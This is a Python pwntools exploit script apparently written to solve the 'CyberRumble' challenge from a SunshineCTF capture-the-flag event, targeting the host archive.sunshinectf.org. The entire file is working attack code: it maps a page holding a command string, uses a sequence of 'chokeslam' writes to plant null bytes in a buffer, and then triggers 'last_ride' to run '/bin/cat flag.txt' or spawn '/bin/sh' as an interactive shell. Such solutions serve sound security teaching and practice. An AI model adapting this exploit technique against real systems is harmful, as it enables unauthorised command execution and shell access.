#!/usr/bin/env python
from pwn import *

exe = ELF("CyberRumble")
context(binary=exe)

REMOTE = 1
SHELL = 0


def connect_remote():
	return remote("archive.sunshinectf.org", 19002)

def connect_local():
	r = exe.process()
	# gdb.attach(r, "c")
	return r

def connect():
	return connect_remote() if REMOTE else connect_local()


def do_chokeslam(r, argstr):
	r.sendline("chokeslam %s" % argstr)
	return r.recvline()

def do_old_school(r, argstr, response):
	r.sendline("old_school %s" % argstr)
	r.recvuntil("Shellcode written to ")
	leak = r.recvline().strip().rstrip(".")
	page = int(leak, 16)
	info("Page mapped at 0x%x" % page)
	
	r.recvuntil("Jump to shellcode?")
	r.sendline(response)
	
	return page

def do_last_ride(r, argstr):
	"""
	Consider the command "last_ride ab\0de\0g\0". We can run this command with the
	following sequence of commands ('.' and '@' can be any characters):
	
	chokeslam .....@g
	chokeslam ..@de
	last_ride ab
	"""
	
	nulls = argstr.count("\0")
	for _ in range(nulls):
		prefix, suffix = argstr.rsplit("\0", 1)
		do_chokeslam(r, "." * len(prefix) + "@" + suffix)
		argstr = prefix
	
	r.sendline("last_ride %s" % argstr)


def main():
	r = connect()
	
	if SHELL:
		command = "/bin/sh"
	else:
		command = "/bin/cat flag.txt"
	
	# Map a page with the contents of a command to run.
	# By responding with something other than y/n, the memory isn't unmapped.
	command_addr = do_old_school(r, command, "x")
	
	# Here are the target contents of the command buffer before we run last_ride
	target = p64(command_addr)
	
	# Place binary address in command buffer and run last_ride command
	do_last_ride(r, target)
	
	if SHELL:
		info("Got a shell!")
		r.interactive()
	else:
		r.recvuntil("sun{", drop=True)
		info("Got flag: sun{%s" % r.recvuntil("}"))

if __name__ == "__main__":
	main()
